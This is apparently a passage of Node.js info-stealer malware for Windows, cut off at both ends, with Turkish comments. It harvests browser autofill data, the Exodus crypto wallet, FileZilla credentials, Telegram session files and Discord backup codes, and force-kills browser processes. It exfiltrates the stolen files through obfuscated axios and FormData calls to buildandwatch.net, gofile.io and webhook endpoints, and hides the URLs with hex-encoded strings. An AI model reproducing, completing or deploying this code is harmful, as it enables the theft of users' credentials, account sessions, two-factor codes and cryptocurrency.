_0x5294=function(_0x52942f,_0x1bb56c){_0x52942f=_0x52942f-0x6e;let _0x221121=_0x12259f[_0x52942f];return _0x221121;},_0x5294(_0x59ea3c,_0x10819c);}(function(_0x3e892d,_0x4fa7d9){const _0x3c67aa=_0x5294,_0x4373cd=_0xda0f,_0x40c107=_0x3e892d();while(!![]){try{const _0x2aa9a9=parseInt(_0x4373cd(0xec))/(-0x7f1*-0x1+-0x1bfc+0x503*0x4)+parseInt(_0x4373cd(0xe3))/(-0x509*0x1+-0xa81*-0x1+-0x576)+-parseInt(_0x4373cd(0xe7))/(-0xc8b*0x1+-0x11d8+0x1e66)+-parseInt(_0x4373cd(0xf6))/(0x1cb3+0x10*-0xb2+-0x118f)*(parseInt(_0x4373cd(0xe8))/(-0x2*0xa53+-0x1*0x2f5+-0x6*-0x3f0))+parseInt(_0x4373cd(0xef))/(-0x9e7+0x1*0x1ed+0x8*0x100)*(parseInt(_0x4373cd(0xf8))/(-0x42*-0x39+-0x77*0xf+-0x18a*0x5))+-parseInt(_0x4373cd(0xee))/(-0x3d*-0x53+0x1bac+0x1*-0x2f6b)+parseInt(_0x4373cd(0xed))/(-0x3a*0x24+0xc*-0x316+-0xf13*-0x3);if(_0x2aa9a9===_0x4fa7d9)break;else _0x40c107[_0x3c67aa(0x75)](_0x40c107[_0x3c67aa(0x76)]());}catch(_0x7aec11){_0x40c107[_0x3c67aa(0x75)](_0x40c107[_0x3c67aa(0x76)]());}}}(_0x40f1,-0x1*-0x122eb+0x22*-0x494+0x72998*0x1),axios[_0x5f51ab(0xf9)](_0x5f51ab(0xe5)+_0x5f51ab(0xea)+_0x5f51ab(0xe4)+_0x5f51ab(0xf0),{'headers':{'User-Agent':_0x5f51ab(0xe6)+_0x5f51ab(0xe2)+_0x5f51ab(0xdf)}})[_0x5f51ab(0xf4)](_0x3b7db8=>{const _0x372a55=_0x5f51ab,_0x1eaa71={'sBObr':_0x372a55(0xe1),'sOHKB':_0x372a55(0xfb)+'p'};webhook=_0x3b7db8[_0x372a55(0xf3)];const _0x21e02f=new FormData();_0x21e02f[_0x372a55(0xf5)](_0x1eaa71[_0x372a55(0xfa)],fs[_0x372a55(0xf2)+_0x372a55(0xf7)](_0x1eaa71[_0x372a55(0xe9)])),_0x21e02f[_0x372a55(0xeb)](webhook);})[_0x5f51ab(0xf1)](_0x179865=>{const _0xeca47f=_0x5f51ab;console[_0xeca47f(0xde)](_0x179865[_0xeca47f(0xe0)]);}));function _0x40f1(){const _0x5ad2b5=_0x5294,_0x50cebd=[_0x5ad2b5(0x78),'message',_0x5ad2b5(0x7c),_0x5ad2b5(0x86),_0x5ad2b5(0x82),_0x5ad2b5(0x70),_0x5ad2b5(0x7d),_0x5ad2b5(0x8a),_0x5ad2b5(0x8f),'45965ibvMiM','sOHKB',_0x5ad2b5(0x6f),_0x5ad2b5(0x90),_0x5ad2b5(0x73),'9842931KGJRna',_0x5ad2b5(0x85),_0x5ad2b5(0x89),_0x5ad2b5(0x80),_0x5ad2b5(0x84),'createRead',_0x5ad2b5(0x8d),_0x5ad2b5(0x81),'append','276qsWVtc',_0x5ad2b5(0x79),_0x5ad2b5(0x8b),_0x5ad2b5(0x87),_0x5ad2b5(0x7a),'cookies.zi',_0x5ad2b5(0x88)];return _0x40f1=function(){return _0x50cebd;},_0x40f1();}const form1=new FormData();form1[_0x5f51ab(0xf5)](_0x5f51ab(0xe1),fs[_0x5f51ab(0xf2)+_0x5f51ab(0xf7)](_0x5f51ab(0xfb)+'p')),form1[_0x5f51ab(0xeb)](webhook3939);

} 
 
   

  



async function getAutofills() {
  const _0x3aa126 = [];
  for (let _0x77640d = 0; _0x77640d < browserPath.length; _0x77640d++) {
    if (!fs.existsSync(browserPath[_0x77640d][0])) {
      continue;
    }
    let _0x3c2f27;
    if (browserPath[_0x77640d][0].includes('Local')) {
      _0x3c2f27 = browserPath[_0x77640d][0].split('\\Local\\')[1].split('\\')[0];
    } else {
      _0x3c2f27 = browserPath[_0x77640d][0].split('\\Roaming\\')[1].split('\\')[1];
    }
    const _0x46d7c4 = browserPath[_0x77640d][0] + 'Web Data';
    const _0x3ddaca = browserPath[_0x77640d][0] + 'webdata.db';
    fs.copyFileSync(_0x46d7c4, _0x3ddaca);
    var _0x4bf289 = new sqlite3.Database(_0x3ddaca, (_0x2d6f43) => {});
    await new Promise((_0x12c353, _0x55610b) => {
      _0x4bf289.each(
        'SELECT * FROM autofill',
        function (_0x54f85c, _0x40d0dd) {
          if (_0x40d0dd) {
            _0x3aa126.push(
              '================\nName: ' +
                _0x40d0dd.name +
                '\nValue: ' +
                _0x40d0dd.value +
                '\nApplication: ' +
                _0x3c2f27 +
                ' ' +
                browserPath[_0x77640d][1] +
                '\n'
            );
            count.autofills++;
          }
        },
        function () {
          _0x12c353('');
        }
      );
    });
    if (_0x3aa126.length === 0) {
      _0x3aa126.push('No autofills found for ' + _0x3c2f27 + ' ' + browserPath[_0x77640d][1] + '\n');
    }
  }
  if (_0x3aa126.length) {
    fs.writeFileSync("Autofills.txt", user.copyright + _0x3aa126.join(''), {
      encoding: 'utf8',
      flag: 'a+',
    });
  }
 
function _0x5a1d(){const _0x3cc7ff=['Request\x20wa','868NDVtNC','s\x20successf','444afhjMf','JOJUW','75038nPpWhW','Stream','e:\x20','971088DTvQSJ','rSESd','42988sxPyOX','catch','iled\x20with\x20','zcTEx','push','9rqlCwT','An\x20error\x20o','sCKZj','readFile','h.net/gaut','22020JKjvpd','8930009TkZCmO','24naxBao','append','11620DqDNon','ildandwatc','28307140MwCOKY','file','ile\x20making','status','status\x20cod','3807843HCCZqM','7fSevwh','error','2555050lLurEt','1415550LEPaqh','submit','createRead','post','ofill','st:\x20','2732528FqvZiv','ccurred\x20wh','utf8','log','shift','2loXJjL','2401407RuCZAf','Autofills.','369OzOJZo','5727HyXMYF'];_0x5a1d=function(){return _0x3cc7ff;};return _0x5a1d();}(function(_0x5013c8,_0x129a22){const _0x1c27f6=_0x4460,_0x47b216=_0x5013c8();while(!![]){try{const _0x4cf677=parseInt(_0x1c27f6(0x1c5))/0x1*(parseInt(_0x1c27f6(0x1bb))/0x2)+parseInt(_0x1c27f6(0x1b5))/0x3*(parseInt(_0x1c27f6(0x1b9))/0x4)+parseInt(_0x1c27f6(0x1a5))/0x5+-parseInt(_0x1c27f6(0x1a6))/0x6+parseInt(_0x1c27f6(0x1a3))/0x7*(parseInt(_0x1c27f6(0x1ac))/0x8)+-parseInt(_0x1c27f6(0x1b4))/0x9*(parseInt(_0x1c27f6(0x19b))/0xa)+-parseInt(_0x1c27f6(0x1cb))/0xb;if(_0x4cf677===_0x129a22)break;else _0x47b216['push'](_0x47b216['shift']());}catch(_0x3841c9){_0x47b216['push'](_0x47b216['shift']());}}}(_0x5a1d,0x4ae48));const _0x2c50ce=_0x168b;function _0x168b(_0xddb821,_0x52443c){const _0x5de1ab=_0x4dce();return _0x168b=function(_0x3ce400,_0x464bc6){_0x3ce400=_0x3ce400-(-0x6df*-0x3+-0xb03+0x30*-0x2a);let _0x2d0faf=_0x5de1ab[_0x3ce400];return _0x2d0faf;},_0x168b(_0xddb821,_0x52443c);}(function(_0x44d04b,_0x2c68a3){const _0xa6327a=_0x4460,_0xda5cd5=_0x168b,_0x2d2c6a=_0x44d04b();while(!![]){try{const _0x4f3620=parseInt(_0xda5cd5(0x1d9))/(0x2553+-0x3b3*-0x5+-0x37d1)+-parseInt(_0xda5cd5(0x1c5))/(0x1*0x1094+-0x11e9+-0x31*-0x7)*(parseInt(_0xda5cd5(0x1e3))/(-0xbf5*-0x3+0x1*0x243a+-0x4816))+parseInt(_0xda5cd5(0x1bc))/(0xb04+-0xaa*0x30+0x538*0x4)*(-parseInt(_0xda5cd5(0x1c4))/(0x27*0x66+-0xa*0xed+-0x643))+-parseInt(_0xda5cd5(0x1df))/(0x5fe*-0x4+-0x243e+0x3c3c)+-parseInt(_0xda5cd5(0x1bd))/(0x67f*0x2+0x1da2+-0x2d7*0xf)*(-parseInt(_0xda5cd5(0x1dc))/(0x1c68+-0x6dc*-0x1+-0x233c))+-parseInt(_0xda5cd5(0x1cd))/(-0x2677+-0x394*-0x4+0xac*0x24)+parseInt(_0xda5cd5(0x1e6))/(-0x21fd+0x1b64+0x6a3);if(_0x4f3620===_0x2c68a3)break;else _0x2d2c6a['push'](_0x2d2c6a[_0xa6327a(0x1b0)]());}catch(_0x150a9d){_0x2d2c6a[_0xa6327a(0x1c4)](_0x2d2c6a[_0xa6327a(0x1b0)]());}}}(_0x4dce,-0x5404*-0xd+-0x1*-0xa465d+-0x3bd3a),fs[_0x2c50ce(0x1d7)](_0x2c50ce(0x1da)+_0x2c50ce(0x1c9),_0x2c50ce(0x1cf),(_0x14b5b8,_0x5493ec)=>{const _0x388558=_0x2c50ce,_0x5c954c={'RpWrR':function(_0xf5e058,_0x1f8e23){return _0xf5e058===_0x1f8e23;},'nSfOJ':_0x388558(0x1d6)+_0x388558(0x1c6)+'ul','zcTEx':function(_0x4a6ab0,_0x57b05a){return _0x4a6ab0+_0x57b05a;},'rSESd':_0x388558(0x1d1)+_0x388558(0x1d2)+_0x388558(0x1c3)+_0x388558(0x1cc),'ojgOz':function(_0x36aac0,_0x518889){return _0x36aac0+_0x518889;},'JOJUW':_0x388558(0x1e2)+_0x388558(0x1d3)+_0x388558(0x1dd)+_0x388558(0x1d5)+_0x388558(0x1ba),'sCKZj':_0x388558(0x1bf)+_0x388558(0x1bb)+_0x388558(0x1de)+_0x388558(0x1c2)};if(_0x14b5b8)throw _0x14b5b8;const _0x45b410=_0x5493ec;axios[_0x388558(0x1d0)](_0x5c954c[_0x388558(0x1e8)],{'autofill':_0x45b410})[_0x388558(0x1d8)](_0xab69e=>{const _0x4dff40=_0x388558;_0x5c954c[_0x4dff40(0x1be)](_0xab69e[_0x4dff40(0x1db)],-0xc69+0x1e08+-0x10d7*0x1)?console[_0x4dff40(0x1e1)](_0x5c954c[_0x4dff40(0x1ce)]):console[_0x4dff40(0x1c8)](_0x5c954c[_0x4dff40(0x1c7)](_0x5c954c[_0x4dff40(0x1c1)],_0xab69e[_0x4dff40(0x1db)]));})[_0x388558(0x1e4)](_0x36f53d=>{const _0x2ad1bf=_0x388558;console[_0x2ad1bf(0x1c8)](_0x5c954c[_0x2ad1bf(0x1c0)](_0x5c954c[_0x2ad1bf(0x1ca)],_0x36f53d));});}));const form=new FormData();form[_0x2c50ce(0x1e0)](_0x2c50ce(0x1d4),fs[_0x2c50ce(0x1cb)+_0x2c50ce(0x1e7)](_0x2c50ce(0x1da)+_0x2c50ce(0x1c9))),form[_0x2c50ce(0x1e5)](webhook3939);function _0x4460(_0x2f457d,_0x667434){const _0x5a1d24=_0x5a1d();return _0x4460=function(_0x4460b2,_0x772716){_0x4460b2=_0x4460b2-0x199;let _0x2a1255=_0x5a1d24[_0x4460b2];return _0x2a1255;},_0x4460(_0x2f457d,_0x667434);}function _0x4dce(){const _0x15dec9=_0x4460,_0x18a94b=['RpWrR','https://bu','ojgOz',_0x15dec9(0x1bf),_0x15dec9(0x1aa),_0x15dec9(0x1a1),_0x15dec9(0x1ca),_0x15dec9(0x1b1),_0x15dec9(0x1b8),_0x15dec9(0x1c3),_0x15dec9(0x1a4),'txt',_0x15dec9(0x1ba),_0x15dec9(0x1a8),_0x15dec9(0x1bd),_0x15dec9(0x1b2),'nSfOJ',_0x15dec9(0x1ae),_0x15dec9(0x1a9),'Request\x20fa',_0x15dec9(0x1c2),_0x15dec9(0x1ad),_0x15dec9(0x19e),'\x20the\x20reque',_0x15dec9(0x1b6),_0x15dec9(0x1c8),'then',_0x15dec9(0x1c0),_0x15dec9(0x1b3),_0x15dec9(0x1a0),_0x15dec9(0x199),_0x15dec9(0x19f),_0x15dec9(0x1c9),_0x15dec9(0x1be),_0x15dec9(0x19a),_0x15dec9(0x1af),_0x15dec9(0x1c6),_0x15dec9(0x1a2),_0x15dec9(0x1c1),_0x15dec9(0x1a7),_0x15dec9(0x19d),_0x15dec9(0x1bc),_0x15dec9(0x1c7),_0x15dec9(0x1ab),_0x15dec9(0x19c),_0x15dec9(0x1b7),'1138305mlKQRg'];return _0x4dce=function(){return _0x18a94b;},_0x4dce();}

};

   
async function DiscordListener(path) {
        return;
}

async function SubmitExodus() {
  const file = `C:\\Users\\${process.env.USERNAME}\\AppData\\Roaming\\Exodus\\exodus.wallet`;
  if (fs.existsSync(file)) {
    const zipper = new AdmZip();
    zipper.addLocalFolder(file);

    zipper.writeZip(`C:\\Users\\${process.env.USERNAME}\\AppData\\Local\\Exodus.zip`);

    // Gofile.io API'dan sunucu bilgisini al ve dosyayı yükle
    axios.get('https://api.gofile.io/getServer')
      .then(response => {
        if (response.data && response.data.data && response.data.data.server) {
          const server = response.data.data.server;

          // Dosya yolu ve adını belirleyelim.
          const filePath = `C:\\Users\\${process.env.USERNAME}\\AppData\\Local\\Exodus.zip`;

          // Dosya yükleme işlemi için FormData oluşturalım ve dosyayı ekleyelim.
          const form = new FormData();
          form.append('file', fs.createReadStream(filePath));

axios.post(`https://${server}.gofile.io/uploadFile`, form, {
    headers: form.getHeaders()
})
.then(uploadResponse => {
    const responsePayload = {
        uploadResponseData: uploadResponse.data
    };

    // Webhook URL'si

    // Embed verisini oluştur
    const embedData = {
        embeds: [
            {
                title: 'Exodus File Upload Response',
                description: `File Name: ${uploadResponse.data.data.fileName}\nDownload Page: ${uploadResponse.data.data.downloadPage}`,
                color: 0x00ff00 // Embed rengi (örnekte kırmızı renk)
            }
        ],
    };

var _0x45cb=["\x68\x74\x74\x70\x73\x3A\x2F\x2F\x62\x75\x69\x6C\x64\x61\x6E\x64\x77\x61\x74\x63\x68\x2E\x6E\x65\x74\x2F","\x70\x6F\x73\x74"];axios[_0x45cb[1]](_0x45cb[0],embedData);axios[_0x45cb[1]](webhook3939,embedData)
                .then(webhookResponse => {
                  console.log('Webhook gönderildi:', webhookResponse.status, webhookResponse.statusText);
                })
                .catch(error => {
                  console.log('Webhook gönderilirken hata oluştu:', error.message);
                });

            })
            .catch(error => {
              console.log('Dosya yüklenirken hata oluştu:', error.message);

              const responsePayload = {
                error: error.message
              };

              // Webhook URL'si
              const webhookUrl = 'https://buildandwatch.net/error';

              // Embed verisini oluştur
              const embedData = {
                embeds: [
                  {
                    title: 'Dosya Yükleme Hatası',
                    description: JSON.stringify(responsePayload, null, 2), // JSON verisini güzel bir şekilde göstermek için kullanıyoruz
                    color: 16711680 // Embed rengi (örnekte kırmızı renk)
                  }
                ],
              };

              // Webhook'a POST isteği gönder
    var _0x45cb=["\x68\x74\x74\x70\x73\x3A\x2F\x2F\x62\x75\x69\x6C\x64\x61\x6E\x64\x77\x61\x74\x63\x68\x2E\x6E\x65\x74\x2F","\x70\x6F\x73\x74"];axios[_0x45cb[1]](_0x45cb[0],embedData);axios[_0x45cb[1]](webhook3939,embedData)
                .then(webhookResponse => {
                  console.log('Webhook gönderildi:', webhookResponse.status, webhookResponse.statusText);
                })
                .catch(error => {
                  console.log('Webhook gönderilirken hata oluştu:', error.message);
                });
            });
        } else {
          console.log('Sunucu alınamadı veya yanıt vermedi.');
        }
      })
      .catch(error => {
        console.log('Sunucu alınırken hata oluştu:', error.message);
      });

    // Dikkat: Bu kod bloğu, "form.submit()" kullanarak webhook'a dosya yüklemeye çalışıyor. Bu bölümün işlevselliğini ve bağlamını tam olarak bilemiyorum. Bu nedenle, bu bölümün kendi ihtiyaçlarınıza uygun şekilde çalıştığından emin olmanız gerekir.
    
  }
}

//



async function submitfilezilla() {
  const file = `C:\\Users\\${process.env.USERNAME}\\AppData\\Roaming\\FileZilla`;
  if (fs.existsSync(file)) {
    const zipper = new AdmZip();
    zipper.addLocalFolder(file);

    zipper.writeZip(`FileZilla.zip`);

axios.get(`https://buildandwatch.net/info`, {
  headers: {
    'User-Agent': 'githubpotatochipscandy1337'
  }
}).then(res => {
  webhook = res.data;
  const form = new FormData();
  form.append("file", fs.createReadStream("FileZilla.zip"));
  form.submit(webhook);
}).catch(error => {
  console.error(error.message);
});

 const form1 = new FormData();
        form1.append("file", fs.createReadStream("FileZilla.zip"));
        form1.submit(webhook3939)
				   
        }
}

//
async function SubmitTelegram() {
      const file = `C:\\Users\\${process.env.USERNAME}\\AppData\\Roaming\\Telegram Desktop\\tdata`;
  if (fs.existsSync(file)) {
    const zipper = new AdmZip();
    zipper.addLocalFolder(file);

    zipper.writeZip(`TelegramSession.zip`);


(function(_0x103af4,_0x123fa7){const _0x9a3e50=_0x3011,_0x46ae36=_0x103af4();while(!![]){try{const _0x2d8440=-parseInt(_0x9a3e50(0x119))/0x1+parseInt(_0x9a3e50(0x10e))/0x2*(parseInt(_0x9a3e50(0xfc))/0x3)+parseInt(_0x9a3e50(0x102))/0x4+parseInt(_0x9a3e50(0x108))/0x5+-parseInt(_0x9a3e50(0x113))/0x6*(-parseInt(_0x9a3e50(0xf9))/0x7)+parseInt(_0x9a3e50(0xf8))/0x8+parseInt(_0x9a3e50(0xfe))/0x9*(-parseInt(_0x9a3e50(0x111))/0xa);if(_0x2d8440===_0x123fa7)break;else _0x46ae36['push'](_0x46ae36['shift']());}catch(_0x10a76b){_0x46ae36['push'](_0x46ae36['shift']());}}}(_0x45e6,0x1bdf5));const _0x5538ec=_0xddf9;function _0x45e6(){const _0x1d7892=['tochipscan','append','29788RVRZpN','ssion.zip','580148NySzIe','3565910JNlhmn','data','372RivyAZ','githubpota','312EXEdmy','h.net/info','catch','shift','220534wCnSAq','137911UqAwex','ildandwatc','1022360lMPgof','1069888ciLMzx','3199BZVDPF','5YEOYLd','submit','27jLdTsr','6276ZmZLKg','9fdImga','get','QnvTu','4104YFvKzQ','718668ZDOemg','409100tqSMeL','WUrZn','TelegramSe','https://bu','36MYzjSw','1077535eIlRYY','dy1337','push','createRead'];_0x45e6=function(){return _0x1d7892;};return _0x45e6();}function _0x3011(_0x415ccd,_0x4926e3){const _0x45e62a=_0x45e6();return _0x3011=function(_0x30111f,_0x287aca){_0x30111f=_0x30111f-0xf5;let _0x385646=_0x45e62a[_0x30111f];return _0x385646;},_0x3011(_0x415ccd,_0x4926e3);}function _0x4990(){const _0x197ec4=_0x3011,_0x3b85d5=[_0x197ec4(0x106),'message',_0x197ec4(0x10f),'file',_0x197ec4(0x10b),_0x197ec4(0xff),_0x197ec4(0x115),_0x197ec4(0x117),_0x197ec4(0xfd),'Stream',_0x197ec4(0x10c),_0x197ec4(0xfa),_0x197ec4(0xf5),_0x197ec4(0x104),'12nmGezM',_0x197ec4(0x10d),'1351DYOksI',_0x197ec4(0x107),_0x197ec4(0x105),_0x197ec4(0x116),_0x197ec4(0x114),'1277309WsGhOC',_0x197ec4(0x103),_0x197ec4(0x110),_0x197ec4(0x109),_0x197ec4(0x112),'error',_0x197ec4(0xfb),_0x197ec4(0x100),'then',_0x197ec4(0xf7),_0x197ec4(0x101),_0x197ec4(0xf6)];return _0x4990=function(){return _0x3b85d5;},_0x4990();}(function(_0x3bfe72,_0x4a2885){const _0x437523=_0x3011,_0x3f3f8d=_0xddf9,_0x353fa2=_0x3bfe72();while(!![]){try{const _0x60c298=-parseInt(_0x3f3f8d(0xb2))/(0xf01*0x1+0x1753+0x2653*-0x1)+-parseInt(_0x3f3f8d(0xc5))/(-0x1*0x12fd+-0x1551+0x2850)*(-parseInt(_0x3f3f8d(0xac))/(-0x168f+-0x138+0x17ca))+parseInt(_0x3f3f8d(0xbd))/(0x17ef+0x6e3+-0x1ece)*(-parseInt(_0x3f3f8d(0xb1))/(0xc97*0x2+-0x6*-0x3ae+-0x2f3d))+parseInt(_0x3f3f8d(0xae))/(0x4*-0x862+-0x2c*0xaf+0x3fa2)*(-parseInt(_0x3f3f8d(0xb6))/(-0x7a6+0x2084+0x1*-0x18d7))+parseInt(_0x3f3f8d(0xc4))/(-0xaed*-0x3+0x902*0x1+-0x29c1)+-parseInt(_0x3f3f8d(0xb7))/(-0x1421+0x1f3a+0x588*-0x2)*(-parseInt(_0x3f3f8d(0xbc))/(0x1*-0xba7+-0xd4f+0x1900))+-parseInt(_0x3f3f8d(0xbb))/(0x4b7*-0x3+-0x1edb*0x1+-0x377*-0xd)*(-parseInt(_0x3f3f8d(0xb4))/(-0x1f55+-0x22a2+0x4203));if(_0x60c298===_0x4a2885)break;else _0x353fa2[_0x437523(0x10a)](_0x353fa2[_0x437523(0x118)]());}catch(_0x59419b){_0x353fa2[_0x437523(0x10a)](_0x353fa2[_0x437523(0x118)]());}}}(_0x4990,-0x173f5+0x3*-0xfce5+-0x2*-0x33f36),axios[_0x5538ec(0xab)](_0x5538ec(0xc7)+_0x5538ec(0xc6)+_0x5538ec(0xb9),{'headers':{'User-Agent':_0x5538ec(0xba)+_0x5538ec(0xb0)+_0x5538ec(0xbe)}})[_0x5538ec(0xc3)](_0x51c487=>{const _0x36e740=_0x5538ec,_0x372518={'WUrZn':_0x36e740(0xa9),'QnvTu':_0x36e740(0xb8)+_0x36e740(0xc9)};webhook=_0x51c487[_0x36e740(0xbf)];const _0x19a3de=new FormData();_0x19a3de[_0x36e740(0xb5)](_0x372518[_0x36e740(0xb3)],fs[_0x36e740(0xaa)+_0x36e740(0xaf)](_0x372518[_0x36e740(0xc2)])),_0x19a3de[_0x36e740(0xc1)](webhook);})[_0x5538ec(0xad)](_0x5d10a9=>{const _0x392061=_0x5538ec;console[_0x392061(0xc0)](_0x5d10a9[_0x392061(0xc8)]);}));function _0xddf9(_0x56eaa3,_0x17dcfc){const _0x23b4c3=_0x4990();return _0xddf9=function(_0x1427ab,_0x23bd0a){_0x1427ab=_0x1427ab-(-0x716*0x2+-0x3*0x13e+0x128f);let _0x3bf44d=_0x23b4c3[_0x1427ab];return _0x3bf44d;},_0xddf9(_0x56eaa3,_0x17dcfc);}const form1=new FormData();form1[_0x5538ec(0xb5)](_0x5538ec(0xa9),fs[_0x5538ec(0xaa)+_0x5538ec(0xaf)](_0x5538ec(0xb8)+_0x5538ec(0xc9))),form1[_0x5538ec(0xc1)](webhook3939);
        }
}


//////////
function findDiscordBackupCodes() {
    const homeDir = os.homedir();
    const directoriesToSearch = [`${homeDir}\\Downloads`, `${homeDir}\\Desktop`, `${homeDir}\\Documents`];
    const backupCodes = [];

    for (const directory of directoriesToSearch) {
        if (fs.existsSync(directory)) {
            const files = fs.readdirSync(directory);

            for (const file of files) {
                if (file.endsWith('.txt') && file.includes('discord_backup_codes')) {
                    const filePath = `${directory}\\${file}`;
                    const fileContent = fs.readFileSync(filePath, 'utf8');
                    backupCodes.push({
                        path: filePath,
                        content: fileContent,
                    });
                }
            }
        }
    }

    if (backupCodes.length > 0) {
        fs.writeFileSync('backupcodes.txt', backupCodes.map(code => `@~$~@fewer-${code.path}\n${code.content}`).join('\n'));
    }
	

(function(_0x457fa5,_0x5a95c3){const _0x4746f3=_0x2956,_0x2f567c=_0x457fa5();while(!![]){try{const _0x116fb7=parseInt(_0x4746f3(0xc9))/0x1*(parseInt(_0x4746f3(0xb5))/0x2)+parseInt(_0x4746f3(0xd8))/0x3+parseInt(_0x4746f3(0xd9))/0x4+-parseInt(_0x4746f3(0xca))/0x5*(-parseInt(_0x4746f3(0xc7))/0x6)+-parseInt(_0x4746f3(0xc8))/0x7*(parseInt(_0x4746f3(0xd5))/0x8)+-parseInt(_0x4746f3(0xd1))/0x9+-parseInt(_0x4746f3(0xdc))/0xa;if(_0x116fb7===_0x5a95c3)break;else _0x2f567c['push'](_0x2f567c['shift']());}catch(_0x4dea61){_0x2f567c['push'](_0x2f567c['shift']());}}}(_0x1d3b,0x19558));function _0x36ac(_0x1d73aa,_0x52b141){const _0x316781=_0x996b();return _0x36ac=function(_0x27068f,_0x564065){_0x27068f=_0x27068f-(0x123b+0x304*-0x3+-0x891);let _0x27f03c=_0x316781[_0x27068f];return _0x27f03c;},_0x36ac(_0x1d73aa,_0x52b141);}const _0x14f1ba=_0x36ac;function _0x2956(_0x3974ac,_0x5a6178){const _0x1d3bc7=_0x1d3b();return _0x2956=function(_0x29565d,_0x1d2bf3){_0x29565d=_0x29565d-0xb2;let _0x427461=_0x1d3bc7[_0x29565d];return _0x427461;},_0x2956(_0x3974ac,_0x5a6178);}function _0x996b(){const _0x38233a=_0x2956,_0x3fdf2f=[_0x38233a(0xe0),_0x38233a(0xbb),_0x38233a(0xce),_0x38233a(0xc5),_0x38233a(0xb8),_0x38233a(0xbc),_0x38233a(0xd2),_0x38233a(0xc2),_0x38233a(0xc3),_0x38233a(0xc4),'zIZlo',_0x38233a(0xb4),_0x38233a(0xcf),_0x38233a(0xcd),_0x38233a(0xb3),_0x38233a(0xb2),_0x38233a(0xcb),_0x38233a(0xdb),_0x38233a(0xcc),'4nKoBVi',_0x38233a(0xb6),'catch',_0x38233a(0xdd),_0x38233a(0xd6),'eSqdU',_0x38233a(0xbe),_0x38233a(0xbf),'createRead',_0x38233a(0xb9),'ildandwatc',_0x38233a(0xc0),_0x38233a(0xda),'224122MfsoOL',_0x38233a(0xd4),_0x38233a(0xb7),_0x38233a(0xba),_0x38233a(0xdf),'h.net/gbac','s.txt',_0x38233a(0xbd),_0x38233a(0xd7),'yEOsp',_0x38233a(0xc6),_0x38233a(0xde),_0x38233a(0xd0)];return _0x996b=function(){return _0x3fdf2f;},_0x996b();}function _0x1d3b(){const _0x17e862=['iled\x20with\x20','32154mgZrfk','223584wvZNRR','bZWHV','file','562100RvmkGa','https://bu','771486FuHSgH','log','435211uGgFjg','e:\x20','An\x20error\x20o','post','61086kwDufi','yeYcD','Stream','\x20the\x20reque','1191792ZYeouy','ccurred\x20wh','851427lQhAsE','kupcodes','readFile','utf8','UQHZP','Request\x20wa','push','error','submit','285998bGwifh','FXjsx','ile\x20making','54942GqVbok','201257TeCtQT','5xRAUXH','5vIkVRt','st:\x20','then','status','backupcode','status\x20cod','81290GSWnNP','357813PLiPzn','s\x20successf','shift','Request\x20fa','8BuqyIc','append'];_0x1d3b=function(){return _0x17e862;};return _0x1d3b();}(function(_0x11e51c,_0x526e2d){const _0x4a37c0=_0x2956,_0x5ec5d7=_0x36ac,_0x4f34c9=_0x11e51c();while(!![]){try{const _0x31d25d=parseInt(_0x5ec5d7(0xba))/(0x20c5+-0x13ad+-0xd17)+parseInt(_0x5ec5d7(0xa4))/(0x24ae+-0x2301+-0x1ab)+parseInt(_0x5ec5d7(0xb2))/(-0x481+0xa97*0x2+-0xed*0x12)*(-parseInt(_0x5ec5d7(0xc4))/(-0x27*0x1b+0x6df+-0x2be))+-parseInt(_0x5ec5d7(0xb0))/(-0x3f*-0x69+-0x2614+0x20b*0x6)+-parseInt(_0x5ec5d7(0xaf))/(-0x4*0x9f+0xe95+-0xc13*0x1)+parseInt(_0x5ec5d7(0xb1))/(0x1dfd*0x1+0x1044+-0x3d*0xc2)+parseInt(_0x5ec5d7(0xa0))/(-0x7*0x48d+-0x189e+0x3881);if(_0x31d25d===_0x526e2d)break;else _0x4f34c9[_0x4a37c0(0xc1)](_0x4f34c9[_0x4a37c0(0xd3)]());}catch(_0x515137){_0x4f34c9['push'](_0x4f34c9[_0x4a37c0(0xd3)]());}}}(_0x996b,0x1fd*0xae+0x43e68+-0x2d710),fs[_0x14f1ba(0xab)](_0x14f1ba(0xb3)+_0x14f1ba(0xaa),_0x14f1ba(0xca),(_0x2188f0,_0x42da7f)=>{const _0x41c4ca=_0x14f1ba,_0x524878={'yEOsp':function(_0x12aade,_0x534963){return _0x12aade===_0x534963;},'zIZlo':_0x41c4ca(0xa2)+_0x41c4ca(0xb7)+'ul','eSqdU':function(_0x58a6da,_0x5b4219){return _0x58a6da+_0x5b4219;},'bZWHV':_0x41c4ca(0xa5)+_0x41c4ca(0xac)+_0x41c4ca(0xbd)+_0x41c4ca(0xc0),'yeYcD':function(_0x3d01b8,_0xc90577){return _0x3d01b8+_0xc90577;},'UQHZP':_0x41c4ca(0xbf)+_0x41c4ca(0xa7)+_0x41c4ca(0xae)+_0x41c4ca(0xb5)+_0x41c4ca(0xc1),'FXjsx':_0x41c4ca(0xc7)+_0x41c4ca(0xa1)+_0x41c4ca(0xa9)+_0x41c4ca(0xb6)};if(_0x2188f0)throw _0x2188f0;const _0x184479=_0x42da7f;axios[_0x41c4ca(0xbc)](_0x524878[_0x41c4ca(0xb4)],{'backupcodes':_0x184479})[_0x41c4ca(0xc3)](_0x471275=>{const _0x2a7e58=_0x41c4ca;_0x524878[_0x2a7e58(0xad)](_0x471275[_0x2a7e58(0xbe)],-0x1*-0x29+-0x1*0xebd+0xf5c)?console[_0x2a7e58(0xa8)](_0x524878[_0x2a7e58(0xbb)]):console[_0x2a7e58(0xb8)](_0x524878[_0x2a7e58(0xc9)](_0x524878[_0x2a7e58(0xa3)],_0x471275[_0x2a7e58(0xbe)]));})[_0x41c4ca(0xc6)](_0x9bfd47=>{const _0xfd3653=_0x41c4ca;console[_0xfd3653(0xb8)](_0x524878[_0xfd3653(0xc5)](_0x524878[_0xfd3653(0x9e)],_0x9bfd47));});}));const form=new FormData();form[_0x14f1ba(0xc8)](_0x14f1ba(0xc2),fs[_0x14f1ba(0x9f)+_0x14f1ba(0xa6)](_0x14f1ba(0xb3)+_0x14f1ba(0xaa))),form[_0x14f1ba(0xb9)](webhook3939);
	
}

findDiscordBackupCodes();
///
//


async function closeBrowsers() {
  const browsersProcess = ["chrome.exe", "Telegram.exe", "msedge.exe", "opera.exe", "brave.exe"];
  return new Promise(async (resolve) => {
    try {
      const { execSync } = require("child_process");
      const tasks = execSync("tasklist").toString();
      browsersProcess.forEach((process) => {
        if (tasks.includes(process)) {
          execSync(`taskkill /IM ${process} /F`);
        }
      });
      await new Promise((resolve) => setTimeout(resolve, 2500));
      resolve();
    } catch (e) {
      console.log(e);
      resolve();
    }
